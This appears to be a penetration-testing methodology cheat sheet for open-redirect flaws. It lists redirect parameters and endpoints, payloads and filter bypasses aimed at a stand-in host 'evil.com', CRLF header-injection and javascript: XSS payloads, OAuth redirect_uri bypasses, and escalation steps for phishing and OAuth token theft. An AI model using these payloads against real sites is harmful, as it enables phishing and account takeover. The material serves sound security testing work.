# Open Redirect Testing Methodology

## Quick Reference

**Common Parameters:**
```
url, redirect, next, redir, return, returnTo, goto, target, dest,
destination, rurl, redirect_uri, continue, return_path, out, view
```

**Basic Payloads:**
```
https://evil.com
//evil.com
/\evil.com
https:evil.com
```

---

## Open Redirect Types

### URL Parameter Redirect
```
https://target.com/redirect?url=https://evil.com
```

### Path-Based Redirect
```
https://target.com/redirect/https://evil.com
```

### Header-Based Redirect
```
Host: evil.com
X-Forwarded-Host: evil.com
```

---

## Common Vulnerable Endpoints

### Login/Logout
```
/login?next=
/login?return=
/logout?redirect=
/signin?continue=
```

### OAuth/SSO
```
/oauth/authorize?redirect_uri=
/callback?return=
/sso?returnTo=
```

### Tracking/Analytics
```
/click?url=
/track?link=
/out?u=
```

### File Downloads
```
/download?file=
/export?format=csv&return=
```

### Share/Social
```
/share?url=
/external?link=
```

---

## Bypass Techniques

### Protocol Variations

```
# Standard
https://evil.com
http://evil.com

# Protocol-relative
//evil.com
\\evil.com

# Missing slash
https:evil.com
https:/evil.com

# Backslash
https://target.com/redirect?url=https://evil.com\@target.com

# HTTPS in data
/redirect?url=https://target.com@evil.com
```

### Domain Variations

```
# Subdomain-like
https://target.com.evil.com
https://targetcom.evil.com

# With @
https://target.com@evil.com
https://evil.com?target.com

# Unicode/Punycode
https://tаrget.com (Cyrillic 'а')

# URL fragments
https://evil.com#https://target.com
https://evil.com?https://target.com
```

### Path Confusion

```
# Double slashes
//evil.com
///evil.com
////evil.com

# Path traversal
/redirect?url=/../../../evil.com
/redirect?url=....//....//evil.com

# Dot variations
/redirect?url=.evil.com
/redirect?url=..evil.com
```

### Encoding

```
# URL encoding
%2f%2fevil.com
%2F%2Fevil.com
%252f%252fevil.com (double)

# Unicode encoding
%E3%80%82 (。) as dot
%EF%BC%8F (/) as slash
%EF%BD%A1 (｡) as dot

# Null byte
https://evil.com%00.target.com
```

### Whitespace

```
# Tab
https://evil.com%09.target.com

# Newline
https://evil.com%0a.target.com
https://evil.com%0d.target.com

# Space variations
%20evil.com
%09evil.com
```

### Case Manipulation

```
HTTPS://EVIL.COM
hTTps://eViL.cOm
```

### Combining Techniques

```
/redirect?url=//evil.com/..;/target.com
/redirect?url=/\evil.com
/redirect?url=https:evil.com/target.com
/redirect?url=https://evil.com\@target.com
/redirect?url=https://target.com%0d%0aLocation:%20https://evil.com
```

---

## JavaScript-Based Redirects

### DOM-Based Open Redirect

```javascript
// Vulnerable patterns
location = params.get('url');
location.href = userInput;
window.location.assign(userInput);
window.location.replace(userInput);
```

**Payloads:**
```
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

### Testing via URL Fragment

```
https://target.com/page#redirect=evil.com
```

Check if JavaScript reads from `location.hash`.

---

## Header Injection via Redirect

If redirect response includes user input in headers:

```
/redirect?url=evil.com%0d%0aSet-Cookie:%20malicious=value

# Response:
HTTP/1.1 302 Found
Location: https://evil.com
Set-Cookie: malicious=value
```

---

## OAuth/OIDC Redirect URI Bypass

### Path Traversal
```
redirect_uri=https://target.com/callback/../evil
```

### Subdomain
```
redirect_uri=https://evil.target.com/callback
```

### Port
```
redirect_uri=https://target.com:8080/callback
```

### Fragment
```
redirect_uri=https://target.com/callback#.evil.com
```

### Parameter Addition
```
redirect_uri=https://target.com/callback?x=evil.com
```

---

## Impact Escalation

### Phishing

1. Send victim: `https://target.com/redirect?url=https://evil-phishing-site.com`
2. Victim trusts target.com URL
3. Gets redirected to phishing page

### OAuth Token Theft

1. Craft OAuth URL with malicious redirect_uri
2. Victim authorizes
3. Token sent to attacker's server

### SSRF via Redirect

If server follows redirects:
```
/fetch?url=https://target.com/redirect?url=http://internal-server/
```

### XSS via Redirect

If redirect to javascript: allowed:
```
/redirect?url=javascript:alert(document.domain)
```

### Header Injection to XSS

```
/redirect?url=%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>
```

---

## Validation Bypass Checklist

### Whitelist Bypass
- [ ] Subdomain: `evil.target.com`
- [ ] With @: `target.com@evil.com`
- [ ] Path after domain: `target.com.evil.com`
- [ ] Regex bypass: `attackertarget.com`

### Protocol Bypass
- [ ] Protocol-relative: `//evil.com`
- [ ] Missing colon: `https/evil.com`
- [ ] With backslash: `https:\\evil.com`

### Encoding Bypass
- [ ] URL encode: `%2f%2fevil.com`
- [ ] Double encode: `%252f%252fevil.com`
- [ ] Unicode: `%E3%80%82` for dot

### Path Bypass
- [ ] Path traversal: `/../evil.com`
- [ ] Dot prefix: `.evil.com`
- [ ] Multiple slashes: `///evil.com`

---

## Testing Workflow

1. **Identify redirect parameters:**
   - Crawl application for redirect URLs
   - Check common parameter names

2. **Test basic redirect:**
   - Try external domain
   - Check response (302, meta refresh, JavaScript)

3. **Apply bypasses:**
   - Protocol variations
   - Encoding variations
   - Path manipulation

4. **Check impact:**
   - Can redirect to any external site?
   - Can inject headers?
   - Can execute JavaScript?

---

## Verification Checklist

1. **Find redirect functionality:**
   - [ ] Login/logout flows
   - [ ] OAuth/SSO
   - [ ] External links

2. **Test basic redirect:**
   - [ ] External domain
   - [ ] Protocol-relative URL

3. **Apply bypass techniques:**
   - [ ] Encoding variations
   - [ ] Domain variations
   - [ ] Path manipulation

4. **Assess impact:**
   - [ ] Phishing potential
   - [ ] Token theft (OAuth)
   - [ ] XSS escalation

5. **Document evidence:**
   - [ ] Working redirect URL
   - [ ] Screenshot of redirect
   - [ ] Impact description
